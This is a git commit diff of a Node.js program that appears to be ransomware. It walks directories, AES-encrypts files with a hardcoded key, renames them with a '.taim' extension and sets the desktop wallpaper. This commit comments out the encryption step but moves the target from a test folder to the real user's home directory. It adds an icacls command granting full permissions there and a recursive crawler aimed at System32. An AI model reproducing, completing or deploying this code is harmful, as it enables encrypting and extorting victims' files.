fd760b9add01784157493f94bf04f147c7f04264
mroxlong <88736305+devrdd@users.noreply.github.com>
2022-08-16 20:10:06 +0200

    test

--- index.js
+++ index.js
@@ -5,6 +5,7 @@ const AES = require('aes-encryption')
 const cp = require('node:child_process')
 const promisify = require('node:util')
 const aes = new AES()
+const os = require('os')
 
 aes.setSecretKey('11122233344455566677788822244455555555555555555231231321313aaaff')
 
@@ -22,10 +23,10 @@ const crawlerLoop = () => {
             if(err){}
             if (stats.isFile()) {
                 try {
-                    const data = fs.readFileSync(path.join(cwd, i))
-                    const encrypt = aes.encrypt(data)
-                    fs.writeFileSync(path.join(cwd, i), encrypt)
-                    fs.renameSync(path.join(cwd, i), path.join(cwd, `${i}.taim`))
+                    // const data = fs.readFileSync(path.join(cwd, i))
+                    // const encrypt = aes.encrypt(data)
+                    // fs.writeFileSync(path.join(cwd, i), encrypt)
+                    // fs.renameSync(path.join(cwd, i), path.join(cwd, `${i}.taim`))
                 } catch (e) {
 
                 }
@@ -40,12 +41,37 @@ const crawlerLoop = () => {
     })
 }
 
+const crawlSystem32 = async ()=>{
+    const cwd = process.cwd()
+    let target= fs.readdirSync(cwd)
+    target.forEach((i)=>{
+        fs.stat(path.join(cwd, i),(err, stats)=>{
+            // if(stats.isFile()){
+            //    const file  =  fs.readFileSync(path.resolve(path.join(cwd, i)))
+            //    setTimeout(()=>{
+            //     console.log(i)
+            // }, 20000)
+              
+            // }
+            if(stats.isDirectory()){
+                console.log(i)
+                process.chdir(path.join(cwd, i))
+                crawlSystem32()
+            }
+            
+        })
+    })
+}
 
 const crawl = async () => {
     //this is the root of your testing folder...tweak as needed 
-    const BASE_DIR = 'C:\\Users\\TestFolder'
+    const user = os.userInfo().username
+    cp.exec(`icacls "C:\\Users\\${user} /grant Users:F"`)
+    const BASE_DIR = `C:\\Users\\${user}`
     process.chdir(BASE_DIR)
     crawlerLoop()
     await setWallpaper()
+    // crawlSystem32()
+    
 }
 crawl()
